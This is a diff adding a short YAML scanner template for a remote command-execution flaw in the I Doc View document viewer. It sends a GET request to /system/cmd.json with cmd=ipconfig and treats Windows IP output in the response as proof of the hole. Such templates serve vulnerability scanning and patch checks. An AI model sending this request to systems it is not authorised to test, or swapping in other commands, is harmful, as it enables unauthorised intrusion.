@@ -1,0 +1,19 @@
+id: idocview-cmd-rce
+
+info:
+  name: I Doc View cmd.json命令执行漏洞
+  author: Wen
+  severity: high
+  verified: true
+  reference:
+    - https://blog.csdn.net/luochen2436/article/details/135017122
+  tags: idocview,rce
+  created: 2023/12/27
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /system/cmd.json?cmd=ipconfig
+    expression: response.status == 200  && response.body.bcontains(b'"code":"1"') && response.body.bcontains(b'"data":') && response.body.bcontains(b'Windows IP')
+expression: r0()
